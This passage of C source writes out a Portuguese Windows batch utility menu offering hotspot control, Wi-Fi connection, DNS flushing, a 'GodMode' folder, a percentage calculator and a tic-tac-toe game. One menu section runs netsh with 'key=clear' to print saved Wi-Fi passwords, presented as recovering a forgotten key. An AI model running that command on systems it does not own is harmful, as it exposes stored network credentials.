	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":stophotwifi												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Desligando Hotspot WiFi...									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"netsh wlan stop hostednetwork										\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M:\"Verificar status do Hotspot\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :verstatus									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :redewifi									\n");

	fprintf(arqWin,":verstatus												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"netsh wlan show hostednetwork										\n");
	fprintf(arqWin,"goto :F													\n");
	fprintf(arqWin,":wifi													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"netsh wlan show network mode=bssid									\n");

	fprintf(arqWin,"choice /C SN /M \"Conectar a alguma rede Wi-Fi\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :2D1										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :redewifi									\n");

	fprintf(arqWin,":2D1													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"SET /P NET=Digite o nome da rede (SSID):								\n");
	fprintf(arqWin,"netsh wlan connect name=%%NET%%										\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :redewifi									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit									        \n");//l2011


	fprintf(arqWin,":wifi2	       												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   +-------------------------------------------------------------------+				\n");
	fprintf(arqWin,"echo   ^|                                                                   ^|				\n");
	fprintf(arqWin,"echo   ^| Se voce n∆o se lembra de sua senha de seguranca da rede, podera   ^|				\n");
	fprintf(arqWin,"echo   ^| visualizar sua senha Wi-fi aqui.                                  ^|				\n");
	fprintf(arqWin,"echo   ^| As senhas v∆o estar depois do \"Conte£do da Chave\".              ^|				\n");
	fprintf(arqWin,"echo   ^|                                                                   ^|				\n");
	fprintf(arqWin,"echo   +-------------------------------------------------------------------+				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /P teste=Digite o nome da rede (SSID):								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"netsh wlan show profile name=%%teste%% key=clear | find \"da Chave\"					\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Conclu°do!											\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :redewifi									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":G													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"color 0A												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo * Utilitarios											\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 1 - Ativar GodMode										\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 2 - Calculadora de %%%%									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 3 - Filme Star Wars Ep. IV									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 4 - Jogo da velha (game)									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 5 - Limpar o cache DNS									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 6 - Verificar erros no Windows								\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 7 - Retornar ao menu principal 								\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C 12345678 /M:\"Escolha uma das opcoes\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :godmode									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :calc										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :starwars									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :velha									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==5 goto :cdns										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==6 goto :scanerror									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==7 goto 1x										\n");

	fprintf(arqWin,":calc													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   +---------------------------------------------+							\n");
	fprintf(arqWin,"echo   ^|                                            ^|							\n");
	fprintf(arqWin,"echo   ^| %%%% Calculo da relacao de porcentagem %%%%^|							\n");
	fprintf(arqWin,"echo   ^|                                            ^|							\n");
	fprintf(arqWin,"echo   +---------------------------------------------+							\n");
	fprintf(arqWin,"echo.													\n");	
	fprintf(arqWin,"set /p numero_a=Digite o primeiro nß:									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p numero_b=Digite o segundo nß:									\n");
	fprintf(arqWin,"set /a relacao_porc=(%%numero_b%% * 100) / %%numero_a%%							\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   %%numero_b%% equivale a %%relacao_porc%% porcento de %%numero_a%%				\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :G										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":cdns													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   +----------------------------------------------------------+					\n");
	fprintf(arqWin,"echo   ^|                                                          ^|					\n");
	fprintf(arqWin,"echo   ^| Limpar o cache DNS pode resolver o problema de lentid∆o  ^|					\n");
	fprintf(arqWin,"echo   ^| na navegacao via web browser!                            ^|					\n");
	fprintf(arqWin,"echo   ^|                                                          ^|					\n");
	fprintf(arqWin,"echo   +----------------------------------------------------------+					\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M:\"Limpar cache DNS\"									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :sdns										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :G										\n");

	fprintf(arqWin,":sdns													\n");
	fprintf(arqWin,"ipconfig /flushdns											\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :G													\n");

	fprintf(arqWin,":godmode												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"color 1E												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo                     **********************************						\n");
	fprintf(arqWin,"echo                     *                                *						\n");
	fprintf(arqWin,"echo                     * Ativando o modo Deus (GodMode) *						\n");
	fprintf(arqWin,"echo                     *                                *						\n");
	fprintf(arqWin,"echo                     **********************************						\n");
	fprintf(arqWin,"echo.													\n");	
	fprintf(arqWin,"echo   GodMode eh um painel de controle avancado que re£ne todas as ferramentas				\n");
	fprintf(arqWin,"echo   necessarias para gerenciar sua maquina.								\n");
	fprintf(arqWin,"echo.                                                                                                   \n");

	fprintf(arqWin,"choice /C SN /M \"Criar um diret¢rio GodMode agora\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :2GM										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :G									        \n");//l2124


	fprintf(arqWin,":2GM													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Sera criado um diret¢rio GodMode em sua desktop, aguarde...					\n");
	fprintf(arqWin,"C:													\n");
	fprintf(arqWin,"CD C:\\Users\\%%USERNAME%%\\Desktop									\n");
	fprintf(arqWin,"ping 127.0.0.1 -n 2 > nul										\n");
	fprintf(arqWin,"IF EXIST GodMode.{ED7BA470-8E54-465E-825C-99712043E01C} GOTO :endx					\n");
	fprintf(arqWin,"IF NOT EXIST GodMode.{ED7BA470-8E54-465E-825C-99712043E01C} GOTO :inix					\n");
	fprintf(arqWin,":inix													\n");
	fprintf(arqWin,"MD GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}							\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Conclu°do!											\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :G													\n");

	fprintf(arqWin,":endx													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Ja existe um diret¢rio GodMode!									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :G													\n");

	fprintf(arqWin,":velha													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"SETLOCAL ENABLEDELAYEDEXPANSION										\n");
	fprintf(arqWin,"ECHO.													\n");
	fprintf(arqWin,"echo                        ***********************************						\n");
	fprintf(arqWin,"Echo                        JOGO DA VELHA FEITO POR SAA							\n");
	fprintf(arqWin,"echo                        ***********************************						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo 1 - Computador Facil.										\n");
	fprintf(arqWin,"echo 2 - Computador moderado.										\n");
	fprintf(arqWin,"echo 3 - Computador dificil.										\n");
	fprintf(arqWin,"echo 4 - Computador impossivel.										\n");
	fprintf(arqWin,"echo 5 - Sair.												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set/p OPT=Escolha a dificuldade:									\n");
	fprintf(arqWin,":xC													\n");
	fprintf(arqWin,"FOR /L %%%%A IN (1,1,9) DO SET NUM%%%%A=								\n");
	fprintf(arqWin,"SET GP=													\n");
	fprintf(arqWin,"SET CONT=												\n");
	fprintf(arqWin,"SET JOG=												\n");

	fprintf(arqWin,"if \"%%OPT%%\"==\"5\" EXIT										\n");
	fprintf(arqWin,"FOR /L %%%%A IN (1,1,54) DO SET A%%%%A=   								\n");      
	fprintf(arqWin,"FOR /L %%%%A IN (3,6,51) DO (										\n");
	fprintf(arqWin,"SET /A CONT=CONT+1											\n");
	fprintf(arqWin,"SET A%%%%A=      !CONT!  										\n");
	fprintf(arqWin,")													\n");
	fprintf(arqWin,":1													\n");
	fprintf(arqWin,"CLS													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo  !A1!∫!A7!∫!A13!											\n");
	fprintf(arqWin,"echo  !A2!∫!A8!∫!A14!											\n");
	fprintf(arqWin,"echo  !A3!∫!A9!∫!A15!											\n");
	fprintf(arqWin,"echo  !A4!∫!A10!∫!A16!											\n");
	fprintf(arqWin,"echo  !A5!∫!A11!∫!A17!											\n");
	fprintf(arqWin,"echo  !A6!∫!A12!∫!A18!											\n");
	fprintf(arqWin,"echo  ÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕ								\n");
	fprintf(arqWin,"echo  !A19!∫!A25!∫!A31!											\n");
	fprintf(arqWin,"echo  !A20!∫!A26!∫!A32!											\n");
	fprintf(arqWin,"echo  !A21!∫!A27!∫!A33!											\n");
	fprintf(arqWin,"echo  !A22!∫!A28!∫!A34!											\n");
	fprintf(arqWin,"echo  !A23!∫!A29!∫!A35!											\n");
	fprintf(arqWin,"echo  !A24!∫!A30!∫!A36!											\n");
	fprintf(arqWin,"echo  ÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕ								\n");
	fprintf(arqWin,"echo  !A37!∫!A43!∫!A49!											\n");
	fprintf(arqWin,"echo  !A38!∫!A44!∫!A50!											\n");
	fprintf(arqWin,"echo  !A39!∫!A45!∫!A51!											\n");
	fprintf(arqWin,"echo  !A40!∫!A46!∫!A52!											\n");
	fprintf(arqWin,"echo  !A41!∫!A47!∫!A53!											\n");
	fprintf(arqWin,"echo  !A42!∫!A48!∫!A54!											\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"IF \"%%GP%%\"==\"1\" GOTO GANHOU									\n");
	fprintf(arqWin,"IF \"%%GP%%\"==\"2\" GOTO PERDEU									\n");
	fprintf(arqWin,"IF \"%%JOG%%\"==\"9\" GOTO VELHA									\n");
	fprintf(arqWin,"SET VOLTA=2&GOTO GP											\n");//l2204

	fprintf(arqWin,":2													\n");
	fprintf(arqWin,"SET/P NUM=Em qual casa voce quer jogar(1-9):								\n");
	fprintf(arqWin,"IF %%NUM%% LEQ 0 GOTO 1											\n");
	fprintf(arqWin,"IF %%NUM%% GEQ 10 GOTO 1										\n");
	fprintf(arqWin,"IF DEFINED NUM%%NUM%% GOTO 1										\n");
	fprintf(arqWin,"SET NUM%%NUM%%=1											\n");
	fprintf(arqWin,"SET /A B=NUM*6-5											\n");
	fprintf(arqWin,"SET /A C=NUM*6-4											\n");
	fprintf(arqWin,"SET /A D=NUM*6-3											\n");
	fprintf(arqWin,"SET /A E=NUM*6-2											\n");
	fprintf(arqWin,"SET /A F=NUM*6-1											\n");
	fprintf(arqWin,"SET /A G=NUM*6												\n");
	fprintf(arqWin,"SET A%%B%%=    €€€€ 											\n");
	fprintf(arqWin,"SET A%%C%%=   €    €											\n");
	fprintf(arqWin,"SET A%%D%%=  €      €											\n");
	fprintf(arqWin,"SET A%%E%%=  €      €											\n");
	fprintf(arqWin,"SET A%%F%%=   €    €											\n");
	fprintf(arqWin,"SET A%%G%%=    €€€€ 											\n");
	fprintf(arqWin,"SET /A JOG=JOG+1											\n");
	fprintf(arqWin,"SET VOLTA=3&GOTO GP											\n");
	fprintf(arqWin,":3													\n");
	fprintf(arqWin,"SET NUM=%%RANDOM:~-1%%											\n");
	fprintf(arqWin,"IF \"%%NUM%%\"==\"0\" GOTO 3										\n");
	fprintf(arqWin,"IF DEFINED NUM%%NUM%% GOTO 3										\n");
	fprintf(arqWin,"IF \"%%OPT%%\"==\"4\" (											\n");
	fprintf(arqWin,"IF NOT DEFINED NUM2 IF \"%%NUM1%%%%NUM9%%\"==\"11\" SET NUM=2						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM4 IF \"%%NUM1%%%%NUM9%%\"==\"11\" SET NUM=4						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM6 IF \"%%NUM1%%%%NUM9%%\"==\"11\" SET NUM=6						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM8 IF \"%%NUM1%%%%NUM9%%\"==\"11\" SET NUM=8						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM2 IF \"%%NUM3%%%%NUM7%%\"==\"11\" SET NUM=2						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM4 IF \"%%NUM3%%%%NUM7%%\"==\"11\" SET NUM=4						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM6 IF \"%%NUM3%%%%NUM7%%\"==\"11\" SET NUM=6						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM8 IF \"%%NUM3%%%%NUM7%%\"==\"11\" SET NUM=8						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM2%%%%NUM4%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM2%%%%NUM6%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM4%%%%NUM8%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM6%%%%NUM8%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM2%%%%NUM8%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM2%%%%NUM8%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM2%%%%NUM8%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM2%%%%NUM8%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM4%%%%NUM6%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM4%%%%NUM6%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM4%%%%NUM6%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM4%%%%NUM6%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM1%%%%NUM8%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM1%%%%NUM6%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM3%%%%NUM8%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM3%%%%NUM4%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM2%%%%NUM7%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM6%%%%NUM7%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM2%%%%NUM9%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM4%%%%NUM9%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"GOTO PC4												\n");
	fprintf(arqWin,")													\n");
	fprintf(arqWin,"IF \"%%OPT%%\"==\"3\" (											\n");
	fprintf(arqWin,":PC4													\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 SET NUM=5										\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM5%%\"==\"1\" SET NUM=1							\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM5%%\"==\"1\" SET NUM=3							\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM5%%\"==\"1\" SET NUM=7							\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM5%%\"==\"1\" SET NUM=9							\n");
	fprintf(arqWin,"GOTO PC3												\n");
	fprintf(arqWin,")													\n");	
	fprintf(arqWin,"IF \"%%OPT%%\"==\"2\" (											\n");
	fprintf(arqWin,":PC3													\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM1%%%%NUM2%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM2 IF \"%%NUM1%%%%NUM3%%\"==\"11\" SET NUM=2						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM2%%%%NUM3%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM6 IF \"%%NUM4%%%%NUM5%%\"==\"11\" SET NUM=6						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM4%%%%NUM6%%\"==\"11\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM4 IF \"%%NUM5%%%%NUM6%%\"==\"11\" SET NUM=4						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM7%%%%NUM8%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM8 IF \"%%NUM7%%%%NUM9%%\"==\"11\" SET NUM=8						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM8%%%%NUM9%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM1%%%%NUM4%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM4 IF \"%%NUM1%%%%NUM7%%\"==\"11\" SET NUM=4						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM4%%%%NUM7%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM8 IF \"%%NUM2%%%%NUM5%%\"==\"11\" SET NUM=8						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM2%%%%NUM8%%\"==\"11\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM2 IF \"%%NUM5%%%%NUM8%%\"==\"11\" SET NUM=2						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM3%%%%NUM6%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM6 IF \"%%NUM3%%%%NUM9%%\"==\"11\" SET NUM=6						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM6%%%%NUM9%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM1%%%%NUM5%%\"==\"11\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM1%%%%NUM9%%\"==\"11\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM5%%%%NUM9%%\"==\"11\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM3%%%%NUM5%%\"==\"11\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM3%%%%NUM7%%\"==\"11\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM5%%%%NUM7%%\"==\"11\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM1%%%%NUM2%%\"==\"22\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM2 IF \"%%NUM1%%%%NUM3%%\"==\"22\" SET NUM=2						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM2%%%%NUM3%%\"==\"22\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM6 IF \"%%NUM4%%%%NUM5%%\"==\"22\" SET NUM=6						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM4%%%%NUM6%%\"==\"22\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM4 IF \"%%NUM5%%%%NUM6%%\"==\"22\" SET NUM=4						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM7%%%%NUM8%%\"==\"22\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM8 IF \"%%NUM7%%%%NUM9%%\"==\"22\" SET NUM=8						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM8%%%%NUM9%%\"==\"22\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM1%%%%NUM4%%\"==\"22\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM4 IF \"%%NUM1%%%%NUM7%%\"==\"22\" SET NUM=4						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM4%%%%NUM7%%\"==\"22\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM8 IF \"%%NUM2%%%%NUM5%%\"==\"22\" SET NUM=8						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM2%%%%NUM8%%\"==\"22\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM2 IF \"%%NUM5%%%%NUM8%%\"==\"22\" SET NUM=2						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM3%%%%NUM6%%\"==\"22\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM6 IF \"%%NUM3%%%%NUM9%%\"==\"22\" SET NUM=6						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM6%%%%NUM9%%\"==\"22\" SET NUM=3						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM9 IF \"%%NUM1%%%%NUM5%%\"==\"22\" SET NUM=9						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM1%%%%NUM9%%\"==\"22\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM1 IF \"%%NUM5%%%%NUM9%%\"==\"22\" SET NUM=1						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM7 IF \"%%NUM3%%%%NUM5%%\"==\"22\" SET NUM=7						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM5 IF \"%%NUM3%%%%NUM7%%\"==\"22\" SET NUM=5						\n");
	fprintf(arqWin,"IF NOT DEFINED NUM3 IF \"%%NUM5%%%%NUM7%%\"==\"22\" SET NUM=3						\n");
	fprintf(arqWin,")													\n");//l2320

	fprintf(arqWin,"SET NUM%%NUM%%=2											\n");
	fprintf(arqWin,"SET /A B=NUM*6-5											\n");
	fprintf(arqWin,"SET /A C=NUM*6-4											\n");
	fprintf(arqWin,"SET /A D=NUM*6-3											\n");
	fprintf(arqWin,"SET /A E=NUM*6-2											\n");
	fprintf(arqWin,"SET /A F=NUM*6-1											\n");
	fprintf(arqWin,"SET /A G=NUM*6												\n");
	fprintf(arqWin,"SET A%%B%%=   €    €											\n");
	fprintf(arqWin,"SET A%%C%%=    €  € 											\n");
	fprintf(arqWin,"SET A%%D%%=     €€ 											\n"); 
	fprintf(arqWin,"SET A%%E%%=     €€ 											\n"); 
	fprintf(arqWin,"SET A%%F%%=    €  € 											\n");
	fprintf(arqWin,"SET A%%G%%=   €    €											\n");
	fprintf(arqWin,"SET /A JOG=JOG+1											\n");
	fprintf(arqWin,"SET VOLTA=1&GOTO GP											\n");
	fprintf(arqWin,":GP													\n");	
	fprintf(arqWin,"IF \"%%NUM1%%%%NUM2%%%%NUM3%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM4%%%%NUM5%%%%NUM6%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM7%%%%NUM8%%%%NUM9%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM1%%%%NUM4%%%%NUM7%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM2%%%%NUM5%%%%NUM8%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM3%%%%NUM6%%%%NUM9%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM1%%%%NUM5%%%%NUM9%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM3%%%%NUM5%%%%NUM7%%\"==\"111\" SET GP=1							\n");
	fprintf(arqWin,"IF \"%%NUM1%%%%NUM2%%%%NUM3%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM4%%%%NUM5%%%%NUM6%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM7%%%%NUM8%%%%NUM9%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM1%%%%NUM4%%%%NUM7%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM2%%%%NUM5%%%%NUM8%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM3%%%%NUM6%%%%NUM9%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM1%%%%NUM5%%%%NUM9%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF \"%%NUM3%%%%NUM5%%%%NUM7%%\"==\"222\" SET GP=2							\n");
	fprintf(arqWin,"IF DEFINED GP GOTO 1											\n");
	fprintf(arqWin,"IF \"%%JOG%%\"==\"9\" GOTO 1										\n");
	fprintf(arqWin,"GOTO %%VOLTA%%												\n");
	fprintf(arqWin,":GANHOU													\n");
	fprintf(arqWin,"ECHO PARABENS, VOCE GANHOU.										\n");
	fprintf(arqWin,"SET /P J=Deseja jogar novamente? (S/N):									\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"S\" GOTO xC										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"N\" EXIT										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"s\" GOTO xC										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"n\" EXIT										\n");
	fprintf(arqWin,"EXIT													\n");
	fprintf(arqWin,":PERDEU													\n");
	fprintf(arqWin,"ECHO QUE PENA, VOCE PERDEU.										\n");
	fprintf(arqWin,"SET /P J=Deseja jogar novamente? (S/N):									\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"S\" GOTO xC										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"N\" EXIT										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"s\" GOTO xC										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"n\" EXIT										\n");
	fprintf(arqWin,"EXIT													\n");
	fprintf(arqWin,":VELHA													\n");
